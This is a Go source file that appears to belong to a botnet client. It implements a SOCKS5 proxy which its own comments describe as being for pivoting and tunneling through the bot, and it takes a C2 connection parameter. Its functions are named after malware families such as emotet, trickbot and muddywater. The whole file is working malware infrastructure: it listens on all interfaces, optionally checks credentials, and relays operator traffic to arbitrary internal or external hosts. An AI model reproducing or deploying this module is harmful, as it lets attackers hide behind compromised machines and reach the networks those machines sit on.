package main

import (
	"fmt"
	"io"
	"net"
	"strconv"
	"sync/atomic"
	"time"
)

// ============================================================================
// SOCKS5 PROXY FUNCTIONS
// Implements a SOCKS5 proxy server for pivoting/tunneling through the bot.
// ============================================================================

// muddywater starts a SOCKS5 proxy server on the specified port.
// Limits concurrent connections to lazarusMax (100) to prevent resource exhaustion.
// Parameters:
//   - port: TCP port to bind the SOCKS5 proxy to
//   - c2Conn: C2 connection (unused, kept for interface consistency)
//
// Returns: error if proxy already running or port binding fails
func muddywater(port string, c2Conn net.Conn) error {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive {
		return fmt.Errorf("SOCKS proxy already running")
	}
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		return fmt.Errorf("invalid port: %s", port)
	}
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to bind: %v", err)
	}
	lazarusListener = listener
	lazarusActive = true
	atomic.StoreInt32(&lazarusCount, 0)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				lazarusMutex.Lock()
				running := lazarusActive
				lazarusMutex.Unlock()
				if running {
					continue
				}
				return
			}
			if atomic.LoadInt32(&lazarusCount) >= lazarusMax {
				conn.Close()
				continue
			}
			atomic.AddInt32(&lazarusCount, 1)
			go func(c net.Conn) {
				defer atomic.AddInt32(&lazarusCount, -1)
				trickbot(c)
			}(conn)
		}
	}()
	return nil
}

// emotet stops the running SOCKS5 proxy server.
// Closes the listener and marks proxy as inactive.
func emotet() {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusListener != nil {
		lazarusListener.Close()
		lazarusListener = nil
	}
	lazarusActive = false
}

// trickbot handles a single SOCKS5 client connection.
// Implements SOCKS5 protocol: version negotiation -> connection request -> relay.
// Supports address types: IPv4 (0x01), domain (0x03), IPv6 (0x04)
// Parameters:
//   - clientConn: Incoming SOCKS5 client connection
func trickbot(clientConn net.Conn) {
	defer clientConn.Close()
	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 513)
	n, err := clientConn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	requireAuth := socksUsername != "" && socksPassword != ""
	if requireAuth {
		// Check if client supports username/password auth (method 0x02)
		methodCount := int(buf[1])
		supportsAuth := false
		for i := 0; i < methodCount && i+2 < n; i++ {
			if buf[2+i] == 0x02 {
				supportsAuth = true
				break
			}
		}
		if !supportsAuth {
			clientConn.Write([]byte{0x05, 0xFF}) // no acceptable methods
			return
		}
		clientConn.Write([]byte{0x05, 0x02}) // select username/password auth

		// Read RFC 1929 sub-negotiation: VER(0x01) | ULEN | UNAME | PLEN | PASSWD
		n, err = clientConn.Read(buf)
		if err != nil || n < 2 || buf[0] != 0x01 {
			return
		}
		ulen := int(buf[1])
		if n < 2+ulen+1 {
			clientConn.Write([]byte{0x01, 0x01}) // auth failure
			return
		}
		username := string(buf[2 : 2+ulen])
		plen := int(buf[2+ulen])
		if n < 2+ulen+1+plen {
			clientConn.Write([]byte{0x01, 0x01})
			return
		}
		password := string(buf[3+ulen : 3+ulen+plen])

		if username != socksUsername || password != socksPassword {
			clientConn.Write([]byte{0x01, 0x01}) // auth failure
			return
		}
		clientConn.Write([]byte{0x01, 0x00}) // auth success
	} else {
		clientConn.Write([]byte{0x05, 0x00}) // no auth required
	}
	n, err = clientConn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	addrType := buf[3]
	var targetAddr string
	var targetPort uint16
	switch addrType {
	case 0x01:
		if n < 10 {
			return
		}
		targetAddr = net.IP(buf[4:8]).String()
		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
	case 0x03:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		targetAddr = string(buf[5 : 5+domainLen])
		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
	case 0x04:
		if n < 22 {
			return
		}
		targetAddr = net.IP(buf[4:20]).String()
		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
	default:
		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer targetConn.Close()
	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
	ip4 := localAddr.IP.To4()
	if ip4 == nil {
		ip4 = net.IPv4(0, 0, 0, 0)
	}
	response := []byte{0x05, 0x00, 0x00, 0x01}
	response = append(response, ip4...)
	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
	clientConn.Write(response)
	clientConn.SetDeadline(time.Time{})
	targetConn.SetDeadline(time.Time{})
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(targetConn, clientConn)
		if tc, ok := targetConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		io.Copy(clientConn, targetConn)
		if tc, ok := clientConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	<-done
	<-done
}
